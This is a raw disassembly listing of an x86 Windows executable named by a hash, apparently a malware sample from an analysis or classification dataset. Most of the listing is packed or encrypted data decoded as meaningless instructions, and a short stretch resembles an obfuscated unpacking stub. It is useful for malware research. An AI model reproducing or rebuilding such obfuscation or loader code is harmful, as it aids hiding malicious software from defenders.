
f849986b578f6ce961df45e08ebbe689a444062c73c9f889c45f4d6a18f3d35f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	bnd jno 0x401026
  401017:	test   al,0x7e
  401019:	jle    0x401099
  40101b:	jle    0x400f9f
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [esi]
  40102d:	cli    
  40102e:	or     al,0xf
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc0
  4010c7:	test   al,0x9f
  4010c9:	imul   esp,DWORD PTR [ecx+0x30364b95],0x4c4b85cb
  4010d3:	test   DWORD PTR [edi],edi
  4010d5:	mov    al,ds:0x4e5fbf58
  4010da:	inc    edx
  4010db:	aad    0x88
  4010dd:	fisubr DWORD PTR [ecx+0xd2bc4da]
  4010e3:	in     al,dx
  4010e4:	jmp    0x6e5a:0x9b198556
  4010eb:	cmp    edi,DWORD PTR [edi+0x9da0ee8]
  4010f1:	mov    WORD PTR [esi+0x515cf42b],cs
  4010f7:	(bad)  
  4010f8:	mov    bl,0xf5
  4010fa:	cs xor al,0x79
  4010fd:	and    al,0x77
  4010ff:	fidiv  DWORD PTR [esi]
  401101:	dec    edi
  401102:	and    eax,0xeeb2bda9
  401107:	inc    esi
  401108:	adc    DWORD PTR [ecx],esp
  40110a:	dec    edi
  40110b:	sub    eax,0x37aa1144
  401110:	jmp    0xc54f:0xf3830eb8
  401117:	mov    bl,0x71
  401119:	scas   eax,DWORD PTR es:[edi]
  40111a:	xchg   ebx,eax
  40111b:	retf   0x97eb
  40111e:	add    edx,eax
  401120:	push   edx
  401121:	cmp    esp,0x68
  401124:	xor    ebx,DWORD PTR [edx-0x37]
  401127:	test   ch,0x6e
  40112a:	pop    eax
  40112b:	enter  0x3ef6,0xb3
  40112f:	xchg   DWORD PTR [esi],esi
  401131:	mov    bl,0xa
  401133:	lock mov edx,0xb4b1a0fc
  401139:	mov    cl,0x62
  40113b:	adc    eax,eax
  40113d:	jne    0x40112d
  40113f:	sbb    BYTE PTR [edi],dh
  401141:	iret   
  401142:	dec    edi
  401143:	push   ebp
  401144:	pusha  
  401145:	pop    ss
  401146:	je     0x40115c
  401148:	sub    bh,BYTE PTR [ecx+ebx*8]
  40114b:	mov    cl,0x5b
  40114d:	sbb    dh,dh
  40114f:	sub    ebx,0x2ede01f9
  401155:	pop    ds
  401156:	leave  
  401157:	inc    ebp
  401158:	push   ss
  401159:	fcom   DWORD PTR [edi+eiz*8-0x1d5a587e]
  401160:	pushf  
  401161:	rol    DWORD PTR [edx+0x1e74b3d6],cl
  401167:	ror    BYTE PTR [ecx],1
  401169:	xchg   al,bh
  40116b:	pop    ecx
  40116c:	(bad)  
  40116d:	das    
  40116e:	sub    eax,0x6690dc2c
  401173:	clc    
  401174:	mov    WORD PTR [ebx+0x9],fs
  401177:	das    
  401178:	xor    cl,dl
  40117a:	iret   
  40117b:	and    DWORD PTR [ebp+0x50],ebp
  40117e:	sub    al,0x55
  401180:	push   ebx
  401181:	add    al,0x9a
  401183:	dec    ebp
  401184:	cmp    ah,bh
  401186:	mov    ebp,0xa3923b90
  40118b:	out    dx,al
  40118c:	jl     0x4011ad
  40118e:	and    eax,DWORD PTR [eax+0x44]
  401191:	jb     0x4011b4
  401193:	(bad)  
  401195:	and    al,BYTE PTR [edi+0x21]
  401198:	std    
  401199:	pop    es
  40119a:	dec    ecx
  40119b:	push   es
  40119c:	jne    0x4011d4
  40119e:	repz rol BYTE PTR [esi-0x4afb6dd4],1
  4011a5:	jno    0x4011e8
  4011a7:	mov    ch,0x77
  4011a9:	int    0xae
  4011ab:	(bad)  
  4011ac:	out    dx,eax
  4011ad:	addr16 ss jmp 0x40116f
  4011b1:	jle    0x4011f0
  4011b3:	retf   0x7f59
  4011b6:	bound  ecx,QWORD PTR [ebp-0x5d]
  4011b9:	shr    DWORD PTR [ecx-0x69c99e07],1
  4011bf:	iret   
  4011c0:	xlat   BYTE PTR ds:[ebx]
  4011c1:	and    BYTE PTR [edx+0x7d0e1e8],ch
  4011c7:	adc    edx,DWORD PTR [ecx-0x42]
  4011ca:	ss adc al,0x44
  4011cd:	push   esi
  4011ce:	mov    WORD PTR [edx+0x4fde160c],?
  4011d4:	jmp    0x401221
  4011d6:	xor    DWORD PTR [esi],eax
  4011d8:	popf   
  4011d9:	outs   dx,BYTE PTR ds:[esi]
  4011da:	ja     0x8be60bf
  4011e0:	jnp    0x401195
  4011e2:	lock lea ecx,[ebx-0x26]
  4011e6:	pop    edx
  4011e7:	fisubr WORD PTR [edx]
  4011e9:	xor    DWORD PTR [eax-0x3f],esp
  4011ec:	cli    
  4011ed:	outs   dx,DWORD PTR ds:[esi]
  4011ee:	outs   dx,BYTE PTR ds:[esi]
  4011ef:	xor    eax,0xde49fbbb
  4011f4:	xor    ch,cl
  4011f6:	rcr    BYTE PTR [ebx],0xb7
  4011f9:	jno    0x4011d6
  4011fb:	mov    cl,0x5e
  4011fd:	cmp    ebx,esp
  4011ff:	jne    0x4011e6
  401201:	loop   0x401263
  401203:	add    al,0x73
  401205:	pusha  
  401206:	into   
  401207:	ss or  al,0xa6
  40120a:	dec    ecx
  40120b:	out    0x3f,al
  40120d:	in     eax,0x63
  40120f:	loopne 0x4011d1
  401211:	xchg   edi,eax
  401212:	sbb    DWORD PTR [eax],edx
  401214:	jle    0x401278
  401216:	pop    esi
  401217:	xchg   ebp,eax
  401218:	imul   esi,DWORD PTR [ecx],0x30f219fd
  40121e:	push   cs
  40121f:	icebp  
  401220:	test   esi,ebx
  401222:	rcl    al,0xbd
  401225:	rcl    ebp,cl
  401227:	mov    ebp,0x13638180
  40122c:	push   ds
  40122d:	pop    ecx
  40122e:	inc    edi
  40122f:	xchg   ebp,eax
  401230:	test   al,0x1a
  401232:	fdivr  QWORD PTR [edx+0x49]
  401235:	aas    
  401236:	in     al,0xf4
  401238:	call   0xbaf9:0x668d4414
  40123f:	imul   ebp,edx,0xffffffcd
  401242:	add    edx,DWORD PTR [edx]
  401244:	cs mov esi,0x6ef6d52a
  40124a:	pop    ds
  40124b:	call   0x94a9:0x6fb3705c
  401252:	(bad)  [esi]
  401254:	add    DWORD PTR [ebp+0x529e74b8],esi
  40125a:	mul    esp
  40125c:	int    0x33
  40125e:	inc    ecx
  40125f:	mov    dl,0x30
  401261:	ret    0x87d3
  401264:	rcr    edx,0x34
  401267:	dec    edx
  401268:	aam    0xa7
  40126a:	je     0x40126c
  40126c:	pusha  
  40126d:	data16 jae 0x4012a4
  401270:	sub    al,BYTE PTR [edi]
  401272:	aad    0xc9
  401274:	jmp    0x40122d
  401276:	(bad)
  401279:	mov    esp,0x3aa3ac54
  40127e:	ret    
  40127f:	loopne 0x4012f8
  401281:	mov    al,0xc7
  401283:	call   0x9554cba6
  401288:	aaa    
  401289:	stos   DWORD PTR es:[edi],eax
  40128a:	aaa    
  40128b:	js     0x401232
  40128d:	xchg   ebx,eax
  40128e:	imul   ecx,DWORD PTR [ebp+0x7932435a],0x13
  401295:	mov    ebx,0xe120648
  40129a:	jmp    0x4012ef
  40129c:	sub    ebx,DWORD PTR [edx-0x60]
  40129f:	mov    al,ds:0x47d2f2d6
  4012a4:	je     0x401253
  4012a6:	mov    bl,0xd9
  4012a8:	fistp  QWORD PTR ds:0xfaafc1e3
  4012ae:	push   ds
  4012af:	dec    ecx
  4012b0:	clc    
  4012b1:	and    al,0x54
  4012b3:	cmc    
  4012b4:	mov    al,0x1d
  4012b6:	mov    ebp,0x7fc99025
  4012bb:	inc    edi
  4012bc:	fidiv  DWORD PTR [ebp+0x6e262e85]
  4012c2:	into   
  4012c3:	jle    0x401329
  4012c5:	dec    ebx
  4012c6:	push   eax
  4012c7:	rol    BYTE PTR [ecx+esi*1+0x324f874b],cl
  4012ce:	adc    al,0xea
  4012d0:	iret   
  4012d1:	test   BYTE PTR [edx+ebp*4],cl
  4012d4:	retf   
  4012d5:	loope  0x40129d
  4012d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012d8:	clc    
  4012d9:	pop    esi
  4012da:	dec    ecx
  4012db:	int    0x17
  4012dd:	lods   al,BYTE PTR ds:[esi]
  4012de:	fild   DWORD PTR [edi+eax*1+0xd268523]
  4012e5:	pop    ebp
  4012e6:	cld    
  4012e7:	dec    ebx
  4012e8:	sub    bh,BYTE PTR [esi]
  4012ea:	lea    ebx,ds:0x97c94389
  4012f0:	pop    ebp
  4012f1:	sahf   
  4012f2:	inc    esi
  4012f3:	jmp    0x51a0267b
  4012f8:	sbb    BYTE PTR ds:0x47937f52,bh
  4012fe:	outs   dx,BYTE PTR ds:[esi]
  4012ff:	sbb    bl,ah
  401301:	jp     0x401287
  401303:	mov    al,ds:0x91d5dbcd
  401308:	cld    
  401309:	push   edx
  40130a:	dec    esi
  40130b:	sub    BYTE PTR [eax],ch
  40130d:	ror    DWORD PTR es:[edi],cl
  401310:	fldenv [esi-0x649a9eb3]
  401316:	cmp    DWORD PTR [esi],0x8bb7d8cf
  40131c:	gs test eax,0xbac3fc2
  401322:	sub    eax,0xedcfdc7a
  401327:	inc    BYTE PTR [edi+edx*4+0x6c]
  40132b:	push   esp
  40132c:	aas    
  40132d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40132e:	(bad)  
  40132f:	retf   
  401330:	cmp    eax,esp
  401332:	sbb    eax,0x3ecb7e7e
  401337:	push   esi
  401338:	pop    edi
  401339:	cmp    dh,BYTE PTR [ebp+ecx*1+0x303dde36]
  401340:	test   BYTE PTR [esi+eax*2-0x23155d07],bl
  401347:	and    al,0x17
  401349:	mov    WORD PTR [edx],es
  40134b:	or     al,0x15
  40134d:	xor    al,0xfb
  40134f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401350:	loope  0x401348
  401352:	dec    ecx
  401353:	test   eax,0x391ae11d
  401358:	push   ds
  401359:	fidiv  WORD PTR [edi+0x5c]
  40135c:	cmp    BYTE PTR [ecx],bl
  40135e:	dec    edx
  40135f:	faddp  st(1),st
  401361:	ins    BYTE PTR es:[edi],dx
  401362:	jno    0x4013c2
  401364:	cs arpl WORD PTR cs:[esi+0x2c88ac07],di
  40136c:	or     al,0x4
  40136e:	ins    DWORD PTR es:[edi],dx
  40136f:	xchg   edx,eax
  401370:	loopne 0x4013c1
  401372:	pop    ds
  401373:	test   DWORD PTR [esi+0x1b],eax
  401376:	push   ecx
  401377:	cmp    eax,0xbfb8405f
  40137c:	inc    eax
  40137d:	cwde   
  40137e:	fnstenv [esi-0x7e]
  401381:	outs   dx,BYTE PTR ds:[esi]
  401382:	je     0x401330
  401384:	and    cl,BYTE PTR [eax-0x3275fd43]
  40138a:	add    ah,BYTE PTR [ecx]
  40138c:	sbb    eax,0x698968d9
  401391:	push   edx
  401392:	jno    0x401356
  401394:	test   eax,0x73cf648a
  401399:	std    
  40139a:	addr16 inc ecx
  40139c:	(bad)  
  40139d:	push   ebx
  40139e:	into   
  40139f:	mul    BYTE PTR [ecx]
  4013a1:	push   ss
  4013a2:	in     al,0xad
  4013a4:	xchg   BYTE PTR [esi+0x933d529],ah
  4013aa:	or     DWORD PTR [edi-0x7e346f68],ebx
  4013b0:	jb     0x401394
  4013b2:	mov    WORD PTR [esi],ss
  4013b4:	sub    esp,0x2c
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430486,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ee20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ee20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ee20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42e9ec
  401403:	mov    ecx,DWORD PTR ds:0x42ee20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ee20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ee24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430556,0x15
  401428:	cmp    DWORD PTR ds:0x430556,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430556,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e7e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42e9f0
  40145f:	cmp    DWORD PTR ds:0x430556,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430556
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430556,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430556
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430556,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43049a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x4c50:0xc48b26e
  4014ab:	add    ah,0xd6
  4014ae:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	jle    0x40143f
  4014b8:	outs   dx,DWORD PTR ds:[esi]
  4014b9:	jne    0x40151d
  4014bb:	xor    al,0xb8
  4014bd:	and    al,0xd1
  4014bf:	xlat   BYTE PTR ds:[ebx]
  4014c0:	pop    edx
  4014c1:	mov    ecx,0x3d770b2f
  4014c6:	adc    DWORD PTR [eax-0xf],eax
  4014c9:	adc    DWORD PTR [eax+0x67ba7007],0x80baaf24
  4014d3:	out    0x3b,eax
  4014d5:	pop    ebx
  4014d6:	mov    edx,0x625fd38e
  4014db:	sbb    BYTE PTR [ecx],bh
  4014dd:	push   0xc705cd75
  4014e2:	test   al,dl
  4014e4:	mov    ebp,0x6c76afc4
  4014e9:	dec    ebp
  4014ea:	retf   0x66c8
  4014ed:	jne    0x40151d
  4014ef:	(bad)  
  4014f0:	call   0xfa3c16e4
  4014f5:	cmp    BYTE PTR [edi-0x443bbdcf],dh
  4014fb:	ds ret 0x810a
  4014ff:	mov    ch,0x55
  401501:	mov    cl,0x5
  401503:	scas   al,BYTE PTR es:[edi]
  401504:	dec    ebx
  401505:	inc    edx
  401506:	lods   eax,DWORD PTR ds:[esi]
  401507:	push   ebp
  401508:	daa    
  401509:	aam    0x99
  40150b:	bound  edx,QWORD PTR [eax]
  40150d:	mov    al,ds:0xca3820f0
  401512:	cwde   
  401513:	jl     0x4014d1
  401515:	out    0x7d,eax
  401517:	dec    BYTE PTR [edi+esi*1+0x13]
  40151b:	out    0x9c,eax
  40151d:	sbb    al,0x26
  40151f:	aas    
  401520:	(bad)  
  401521:	adc    BYTE PTR [ecx+0x32],bl
  401524:	out    0x71,al
  401526:	rcr    esp,1
  401528:	hlt    
  401529:	popf   
  40152a:	push   eax
  40152b:	std    
  40152c:	mov    bl,BYTE PTR [edi]
  40152e:	sub    BYTE PTR [ebx],dh
  401530:	mov    eax,cs
  401532:	test   eax,0xc54b76da
  401537:	sar    DWORD PTR [ebx+edi*4-0x3b],0x4f
  40153c:	pop    ebx
  40153d:	sbb    ebp,DWORD PTR [ecx+0x69]
  401540:	xchg   esp,eax
  401541:	add    dh,BYTE PTR [ebx-0x7b6e9b0a]
  401547:	push   es
  401548:	fwait
  401549:	shl    DWORD PTR [edx-0x51add1c5],0x11
  401550:	push   edx
  401551:	out    dx,eax
  401552:	neg    bl
  401554:	sub    eax,0xd5b435ca
  401559:	sti    
  40155a:	inc    eax
  40155b:	pop    ss
  40155c:	push   eax
  40155d:	inc    edx
  40155e:	pop    es
  40155f:	sub    al,0xf6
  401561:	and    bl,BYTE PTR [eax+0x3690b36f]
  401567:	(bad)  
  401568:	in     eax,dx
  401569:	popf   
  40156a:	xchg   ebp,eax
  40156b:	cmp    ebx,esi
  40156d:	mov    ah,BYTE PTR [edx+esi*1]
  401570:	std    
  401571:	xor    ebp,eax
  401573:	outs   dx,DWORD PTR ds:[esi]
  401574:	and    ebx,DWORD PTR [eax+ecx*1+0x5f41944b]
  40157b:	call   0x5a7ae79
  401580:	arpl   cx,ax
  401582:	repnz pop esi
  401584:	popf   
  401585:	ret    0x2c5b
  401588:	xlat   BYTE PTR ds:[ebx]
  401589:	aaa    
  40158a:	mov    ecx,0x7a415fe2
  40158f:	and    esp,eax
  401591:	test   DWORD PTR [esi+ebp*4+0x7ca41899],eax
  401598:	and    BYTE PTR [eax+0x23],cl
  40159b:	shl    BYTE PTR [edi+0x4756c338],cl
  4015a1:	dec    edx
  4015a2:	clc    
  4015a3:	inc    ebp
  4015a4:	fist   DWORD PTR [edi+0x276f9526]
  4015aa:	xchg   edx,eax
  4015ab:	mov    ecx,0x5c5f58bf
  4015b0:	adc    DWORD PTR [esi+0x27],ebx
  4015b3:	call   0xc6131456
  4015b8:	push   edi
  4015b9:	mov    al,0xf1
  4015bb:	out    0xe9,eax
  4015bd:	adc    eax,0x15f38bb9
  4015c2:	xor    eax,0x239e661f
  4015c7:	jle    0x40162c
  4015c9:	in     al,dx
  4015ca:	add    cl,BYTE PTR [ebp-0x31]
  4015cd:	jg     0x401641
  4015cf:	inc    eax
  4015d0:	lahf   
  4015d1:	or     eax,0x2d215c73
  4015d6:	pop    ecx
  4015d7:	ja     0x401657
  4015d9:	(bad)
  4015dc:	xchg   ecx,eax
  4015dd:	popa   
  4015de:	jmp    0x401574
  4015e0:	jo     0x4015a0
  4015e2:	pop    ss
  4015e3:	mov    ecx,0x4654f51c
  4015e8:	jo     0x4015f7
  4015ea:	js     0x4015e3
  4015ec:	mov    ebp,0x84bc5e0f
  4015f1:	ja     0x4015d9
  4015f3:	repz xchg esp,eax
  4015f5:	adc    DWORD PTR [ebx+0x44],eax
  4015f8:	dec    esp
  4015f9:	repz add BYTE PTR [eax+0x7f6797de],bh
  401600:	inc    edi
  401601:	xor    BYTE PTR [eax+0x62],cl
  401604:	outs   dx,DWORD PTR ds:[esi]
  401605:	inc    edi
  401606:	popf   
  401607:	stos   DWORD PTR es:[edi],eax
  401608:	jge    0x4015db
  40160a:	aad    0x9
  40160c:	mov    bh,0xe3
  40160e:	sub    eax,0x3c2367e4
  401613:	pushf  
  401614:	push   0x6da7029b
  401619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40161a:	xor    al,BYTE PTR [eax+eiz*4+0xc]
  40161e:	sti    
  40161f:	cmp    eax,0xf412dc92
  401624:	aad    0xf8
  401626:	out    0x60,al
  401628:	add    DWORD PTR [edi],edx
  40162a:	pusha  
  40162b:	cmp    bh,0x19
  40162e:	and    BYTE PTR [edx],0xae
  401631:	int    0x85
  401633:	es jns 0x40162e
  401636:	test   al,ah
  401638:	pusha  
  401639:	das    
  40163a:	mov    DWORD PTR [ebp-0x22],eax
  40163d:	ins    DWORD PTR es:[edi],dx
  40163e:	loope  0x4015d6
  401640:	rcr    BYTE PTR [ecx],cl
  401642:	scas   al,BYTE PTR es:[edi]
  401643:	cdq    
  401644:	in     eax,dx
  401645:	repz xor eax,0x2d1906c0
  40164b:	loope  0x4015d0
  40164d:	add    BYTE PTR [ebp+0x7a704caa],0x45
  401654:	sub    al,0x74
  401656:	dec    esp
  401657:	test   al,0xaa
  401659:	ret    
  40165a:	lods   eax,DWORD PTR ds:[esi]
  40165b:	int3   
  40165c:	call   0x51f7:0xdfa391b2
  401663:	popf   
  401664:	or     bh,BYTE PTR [edi+0x55]
  401667:	(bad)  
  401668:	popa   
  401669:	popf   
  40166a:	shr    DWORD PTR ds:0x6907f8e4,cl
  401670:	push   0xc9926287
  401675:	xor    cl,BYTE PTR [edi-0x618a9be8]
  40167b:	dec    esi
  40167c:	cs jl  0x401656
  40167f:	nop
  401680:	jb     0x40166b
  401682:	std    
  401683:	dec    esp
  401684:	not    DWORD PTR [edi+0x46]
  401687:	jl     0x40169f
  401689:	(bad)  
  40168a:	int    0x69
  40168c:	bound  edx,QWORD PTR [ecx]
  40168e:	jae    0x40165b
  401690:	inc    ebx
  401691:	stc    
  401692:	xchg   edi,eax
  401693:	adc    edi,ebp
  401695:	pushf  
  401696:	std    
  401697:	push   edx
  401698:	pusha  
  401699:	jb     0x4016f1
  40169b:	lea    esi,[edi]
  40169d:	repz jp 0x401649
  4016a0:	neg    DWORD PTR [edx+0x3d660514]
  4016a6:	in     eax,dx
  4016a7:	mov    dh,0x19
  4016a9:	push   es
  4016aa:	test   DWORD PTR [eax+0x0],eax
  4016ad:	rcr    DWORD PTR [edi-0x35],1
  4016b0:	pop    ds
  4016b1:	scas   eax,DWORD PTR es:[edi]
  4016b2:	pop    ds
  4016b3:	test   DWORD PTR [eax],esp
  4016b5:	fmul   DWORD PTR [eax+0x7f71e7ed]
  4016bb:	sar    DWORD PTR [esi],1
  4016bd:	dec    ebp
  4016be:	je     0x401700
  4016c0:	out    0x8c,al
  4016c2:	jmp    0x6475e730
  4016c7:	test   eax,0xead3b80e
  4016cc:	arpl   WORD PTR [edi+0x29],bp
  4016cf:	inc    ebx
  4016d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016d1:	aas    
  4016d2:	ins    BYTE PTR es:[edi],dx
  4016d3:	aas    
  4016d4:	mov    cs,WORD PTR [edx+0x123cd361]
  4016da:	ficomp WORD PTR [ecx-0x70b00a90]
  4016e0:	sub    ch,ch
  4016e2:	or     al,0xb9
  4016e4:	inc    ebp
  4016e5:	sub    eax,0x9fa0bcab
  4016ea:	xchg   ebx,eax
  4016eb:	inc    esi
  4016ec:	sbb    eax,0x6c2d2826
  4016f1:	aam    0xce
  4016f3:	jl     0x401692
  4016f5:	out    0xc8,al
  4016f7:	mov    eax,0x6885be16
  4016fc:	push   ebp
  4016fd:	bound  eax,QWORD PTR [ecx+0x73]
  401700:	shl    edx,0xc8
  401703:	mov    edi,0xe445a69
  401708:	retf   
  401709:	aas    
  40170a:	xchg   BYTE PTR [ebp-0x29],ch
  40170d:	xchg   ebp,eax
  40170e:	mov    eax,0xba637f9
  401713:	iret   
  401714:	dec    esi
  401715:	jnp    0x4016f8
  401717:	iret   
  401718:	(bad)  
  401719:	mov    esp,0x8db752ca
  40171e:	sub    BYTE PTR [esp+ecx*8-0x2a],0xe9
  401723:	call   0xb5676f76
  401728:	loope  0x401716
  40172a:	cld    
  40172b:	mov    ds:0xe8ce4a26,al
  401730:	sbb    esi,0xffffff87
  401733:	adc    DWORD PTR [edi+ebx*1],ebp
  401736:	lahf   
  401737:	cwde   
  401738:	scas   al,BYTE PTR es:[edi]
  401739:	or     al,0x3a
  40173b:	pop    es
  40173c:	xchg   ebx,eax
  40173d:	dec    esi
  40173e:	das    
  40173f:	jb     0x401743
  401741:	sub    eax,0x14933b32
  401746:	xchg   ecx,eax
  401747:	mov    edx,DWORD PTR [edi+0x31ad3b02]
  40174d:	push   0x54
  40174f:	mov    bl,BYTE PTR [ebp-0x39]
  401752:	sbb    DWORD PTR [ebp+0x63],ebp
  401755:	arpl   cx,cx
  401757:	add    eax,0xe1ed83c1
  40175c:	pcmpgtd mm0,QWORD PTR [edi]
  40175f:	adc    ch,BYTE PTR [esi+0x2c]
  401762:	outs   dx,BYTE PTR ds:[esi]
  401763:	and    DWORD PTR [ebx-0x79dfde36],0xc
  40176a:	xchg   edx,eax
  40176b:	pop    esi
  40176c:	mov    cl,0xd4
  40176e:	mov    bh,0x5c
  401770:	out    0x31,al
  401772:	arpl   WORD PTR [ecx-0x38],ax
  401775:	xor    eax,0xe3a05cb7
  40177a:	pop    edi
  40177b:	mov    ch,0xc6
  40177d:	adc    ebp,DWORD PTR [edx]
  40177f:	js     0x4017f0
  401781:	jmp    0xb005:0xb28485bb
  401788:	dec    edi
  401789:	aam    0x86
  40178b:	cmp    DWORD PTR [eax-0x175e5ae3],ebx
  401791:	in     eax,dx
  401792:	sub    esp,esi
  401794:	scas   eax,DWORD PTR es:[edi]
  401795:	cs push ebx
  401797:	adc    ah,BYTE PTR [ebp+0x4aa10385]
  40179d:	cmp    ah,al
  40179f:	mov    esp,0xf0c7dee7
  4017a4:	test   DWORD PTR ds:0x75e6700,edi
  4017aa:	and    ecx,DWORD PTR [edx-0xa]
  4017ad:	or     DWORD PTR [edi+0x40],esp
  4017b0:	jne    0x401754
  4017b2:	lds    ebx,FWORD PTR [esi-0x39]
  4017b5:	test   eax,0x15b6456
  4017ba:	push   edx
  4017bb:	inc    edx
  4017bc:	mov    dl,al
  4017be:	adc    bh,BYTE PTR [ecx+0x395df9a0]
  4017c4:	add    DWORD PTR [edx+0x7e],0xffffffd4
  4017c8:	pop    ecx
  4017c9:	cmp    DWORD PTR [eax+0x29],0xc3588973
  4017d0:	push   ecx
  4017d1:	fs xchg esp,eax
  4017d3:	cmc    
  4017d4:	les    esi,FWORD PTR [edi]
  4017d6:	fwait
  4017d7:	add    al,0xa1
  4017d9:	stos   DWORD PTR es:[edi],eax
  4017da:	push   ss
  4017db:	pop    es
  4017dc:	mov    edx,ds
  4017de:	sub    BYTE PTR [edi-0x33a0feaa],dl
  4017e4:	jbe    0x40182c
  4017e6:	retf   0xba7a
  4017e9:	xor    al,0xce
  4017eb:	dec    esi
  4017ec:	imul   esp,DWORD PTR [esi-0x1b],0xf
  4017f0:	mov    al,ds:0x563d411a
  4017f5:	push   edi
  4017f6:	jae    0x4017d0
  4017f8:	fdivr  DWORD PTR [ecx-0x2d]
  4017fb:	jo     0x4017c4
  4017fd:	aad    0xb6
  4017ff:	fwait
  401800:	dec    esp
  401801:	mov    ebp,0x4467c73f
  401806:	fsubr  st(1),st
  401808:	nop
  401809:	hlt    
  40180a:	ins    BYTE PTR es:[edi],dx
  40180b:	sub    esi,DWORD PTR [edi]
  40180d:	call   0x3ada3bf1
  401812:	jae    0x401823
  401814:	lods   eax,DWORD PTR ds:[esi]
  401815:	repnz out dx,al
  401817:	ja     0x401808
  401819:	aas    
  40181a:	shr    DWORD PTR [ecx-0x14],1
  40181d:	dec    dx
  40181f:	adc    BYTE PTR [edi],al
  401821:	push   esi
  401822:	pop    es
  401823:	mov    esi,0xb652bad0
  401828:	mov    ecx,0x2fc50eed
  40182d:	xchg   esp,eax
  40182e:	adc    BYTE PTR [edx+0x497f1bb9],ch
  401834:	das    
  401835:	in     al,0x68
  401837:	sub    BYTE PTR [edx+0x58],al
  40183a:	(bad)  
  40183b:	and    eax,0xc755463f
  401840:	gs into 
  401842:	mov    esp,0x120beae1
  401847:	mov    ds:0x45897f77,al
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430496
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e762,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x430546,ebx
